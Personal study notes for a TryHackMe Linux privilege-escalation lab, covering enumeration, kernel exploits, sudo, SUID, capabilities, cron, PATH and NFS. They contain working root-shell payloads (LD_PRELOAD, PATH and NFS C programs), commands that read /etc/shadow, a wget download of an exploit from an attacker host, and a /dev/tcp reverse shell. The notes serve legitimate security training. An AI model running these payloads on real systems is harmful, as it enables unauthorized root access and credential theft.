https://tryhackme.com/room/linprivesc

### Table of contents
- [[#y tho]]
- [[#Enumeration]] --> [[#`ps` -- Processes|`ps`]], [[#`find`|`find`]]
- [[#Automated Enumeration]]
- [[#Kernel Exploits]]
- [[#`sudo`]]
- [[#SUID]]
- [[#Capabilities]]
- [[#Cron Jobs]]
- [[#PATH]]
- [[#NFS]]
- [[#Practical]]


___
### y tho
[[#Table of contents|Back to the top]]

- Resetting passwords  
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute administrative commands

___
### Enumeration
[[#Table of contents|Back to the top]]

1st step to take when gaining access to system

**`hostname`**
Target machine hostname, often meaningless (e.g. "Ubuntu-3487340239") but sometimes gives information about machine **role** (e.g. "SQL-PROD-01")

**`uname -a`**
System information --> **kernel**

**`/proc/version`**
Additional information about target **system process** --> **kernel** version, whether **compiler** is installed (e.g. GCC)

**`/etc/issue`**
**OS** info

##### `ps` -- Processes

- **PID:** process ID
- **TTY:** terminal type used by user
- **Time:** amount of CPU time used by the process (NOT time process has been running for)
- **CMD:** command/executable running (will NOT display any command line parameter)
	**`ps -A`:** all running processes
	**`ps axjf`:** process tree
	**`ps aux`:** process for all (a) users, which user (u) launched process, processes not attached to terminal (x); better understanding of system and **potential vulnerabilities**

**`env`**
**Environment** variables
--> **PATH** variable may have **compiler** / **scripting** language (e.g. Python) that could be used to run code on target system / leveraged for privilege escalation

**`sudo -l`**
List commands current user can run using `sudo`

**`ls -la`**: ...

**`id`**
User's **privilege**, **group** memberships or other user's (`id <user_name>`)

**`/etc/passwd`**
Discover users on the system
Cut and convert for **brute-force**: **`cut -d ":" -f 1`**
Find real users: **`grep "home"`**

**`history`**
Sometimes gives up usernames and passwords

**`ifconfig`**
Network interface, useful info for **pivoting** to other target on network
	**`ip route`**: confirm ifconfig info

**`netstat`:** gather existing connections info
	**`-a`:** **a**ll listening ports and connections
	**`-at`/`-au`:** TCP/UDP 
	**`-l`:** ports in listening mode \*
	**`-s`:** network usage **s**tatistics \*
	**`-tp`:** connections with service name and PID, can be prepended with `-l`
	**`-i`:** **i**nterface statistics
	**`-ano`:** **a**ll sockets, **n**ot resolve names, display timers (o)

*\* can be combined with `-t`/`-u` for TCP/UDP*

##### `find`

- General syntax: **`find /directory/to/search -options`**
- **`2>/dev/null`:** redirect errors to /dev/null

- `-name secret.txt`
- `-name python*`
- `-type d -name config`: find directory named "config"

- `-type f -perm 0777`: read, write, execute for all
- `-type f -perm a=x`: execute for all
- `/home -type f -user frank`: find all files owned by frank under /home

- **`-mtime 10`\* :** files **m**odified in last 10 days (only content of file)
- **`-atime 10`\* :** files **a**ccessed in last 10 days
- **`-ctime 10` \* :** files **c**hanged in last 10 days (content of file and metadata)
*\* `time` can be replaced with **`min`** in order to display minutes instead of days*

- **`-size 50M`/`+50M`/`-50M`:** files with exactly / more than / less than 50 MB size
	
- **`-perm -u=s -type f 2>/dev/null`:** files with SUID bit --> run file with **higher privilege** than current user

___
### Automated Enumeration
[[#Table of contents|Back to the top]]

*Only used to save time: manual is better* 

Tool used depends on target system: unable to run Python tool if Python isn't installed on target

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

___
### Kernel Exploits
[[#Table of contents|Back to the top]]

*Kernel manages communication between components (memory, applications, ...)*

1. Identify **kernel version** -- `uname -a` / `/proc/version`
2. Search for **exploit**
3. **Transfer** exploit to target
	1. Set up python web server: **`python -m http.server 8000`**
	2. Download on target machine:
	   **`wget <attacker_IP>:8000/exploit -O /tmp/exploit`**
	   **`Invoke-WebRequest -uri <attacker-IP>:8000/exploit -outfile C:\\Windows\temp\exploit`**
	3. `chmod +x exploit`: make it executable
4. **Run** exploit: `./exploit`

**NB:** failed kernel exploit can lead to system crash

##### Kernel Practical
1. Kernel version: 3.13.0
2. Exploit-DB --> CVE-2015-1328
3. Compile: `gcc 37292.c -o exploit`
4. Set up web server: `python3 -m http.server 8000`
5. Download: `wget 10.81.70.121:8000/exploit -O /tmp/exploit`
6. Make it executable: `chmod +x exploit`
7. Run: `./exploit`

___
### `sudo`
[[#Table of contents|Back to the top]]

*Run program with root privilege* 

User might have been given authorization to run ***some*** programs with root privileges but not all
--> **`sudo -l`** to discover which

Attacker may not have sudo rights for `cat` but for `less` or `nano` for instance

**`sudo nmap --interactive`**: spawns shell with root privilege

[https://gtfobins.github.io/](https://gtfobins.github.io/): information on how any program, on which you may have sudo rights, can be used


**Application functions**
Some application functions can be hijacked to gain access to otherwise inaccessible resources
*Example:* apache2 has a -f function that supports loading alternative config file, we can choose any file that we want to read the 1st line of


**LD_PRELOAD**
Allows programs to use shared libraries
If `env_keep` is enabled --> generate shared library, loaded and executed before program is run

1. Check for `LD_PRELOAD` (with `env_keep` option): **`env_keep+=LD_PRELOAD`**
2. Write C code compiled as shell.so (share object)
`shell.c`
```C
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

3. Run any program with sudo rights (e.g. apache2, find, ...) and LD_PRELOAD option pointing to shell.so
	`sudo LD_PRELOAD=/home/user/ldpreload/shell.so <program_with_sudo_rights>`

$\Rightarrow$ Shell with root privilege has spawned!

___
### SUID
[[#Table of contents|Back to the top]]

Classic permissions: file can or can't be read, written, executed by owner, owner group, others

**SUID:** Set-user Identification
**SGID:** Set-group Identification
--> file can be executed with (group) owner permission level

Indicated by `s` for **s**pecial permission

List files with SUID/SGID set
```Shell
find / -type f -perm -04000 -ls 2>/dev/null
```

**Compare executables with [GTFO Bins list](https://gtfobins.github.io/#+suid)**

##### SUID Practical
1. `find / -type f -perm -04000 -ls 2>/dev/null`: find binaries with SUID set
2. Compare with [GTFO Bins list](https://gtfobins.github.io/#+suid)
	   --> base64 allows to read unreadable files
3. `LFILE=/etc/shadow`
   `/usr/bin/base64 "$LFILE" | base64 --decode`
4. Dictionary attack on hash

___
### Capabilities
[[#Table of contents|Back to the top]]

*Provide additional capabilities to binary without elevating user's privilege*
--> can be hijacked in order to gain additional capabilities without privilege escalating

**`getcap`:** list enabled capabilities

**`getcap -r / 2>/dev/null`:** recursive search with redirection of error messages

**Compare with GTFO Bins list**

___
### Cron Jobs
[[#Table of contents|Back to the top]]

*Run scripts/binaries at specific times, in realistic environment usually run daily/weekly/monthly*

*Common scenario:*
1. *Sys admins need script running at regularly*
2. *They create cron job to do this*
3. *Script becomes useless, they delete it*  
4. *Cron job isn't deleted*

If task is scheduled to run with root privilege --> attempt to modify script in order for our script to run with root privilege

**`/etc/crontab`:** cron jobs info

--> Change .sh file with reverse shell script and catch it with listener
```Bash
#!/bin/sh
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

___
### PATH
[[#Table of contents|Back to the top]]

*Linux environmental variable, tells OS where to find executables*
*--> commands not built-in and not defined with absolute path --> Linux searches in folders defined under environmental variable PATH*

1. What **folders** are located under $PATH
	`echo $PATH`

2. Do I have **write** privileges for any of these folders
```Shell
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```
If we see a `folder` occurring several times on step 1., refine search:
```Shell
find / -writable 2>/dev/null | grep "folder" | cut -d "/" -f 2,3 | sort -u
```

3. Can I **modify** $PATH --> try to add easiest folder to write to: **`/tmp`**
	`export PATH=/tmp:$PATH`

4. Is there a **script/application** I can start that will be affected by this vulnerability

**Payload, `path.c`**
```C
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("puck");
}
```
*looks for "puck" executable under PATH*
`gcc path.c -o path`
`chmod u+s path` (SUID)

In writable folder under PATH
`echo "/bin/bash" > puck`
`chmod 777 puck`

*Just executing `puck` wouldn't privilege escalate, running `path` gives us privilege escalation because it runs with root privileges*

*`puck` can give a root shell, but it could also be a simple `cat` command in order to read a restricted file*

___
### NFS
[[#Table of contents|Back to the top]]

*Network File Sharing --> SSH, Telnet*

Default: NFS changes root user to nfsnobody  and strip any file from operating with root privileges. 

If **`no_root_squash`** option is present on writable share (e.g. `/tmp`) --> create executable with SUID and run on target

1. On attacker machine, **enumerate** target mountable shares and find which ones have `no_root_squash`
	**`showmount -e target_ip`**
	**`cat /etc/exports`**

2. On attacker machine, **mount** `no_root_squash` share
	**`mkdir` /tmp/backupsonattackermachine**
	**`mount -o rw target_ip:/backups /tmp/backupsonattackermachine`**

3. On attacker machine, in `/tmp/backupsonattackermachine`, build **executable**
**`nfs.c`**
```C
int main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```
`gcc nfs.c -o nfs`
`chmod +s nfs`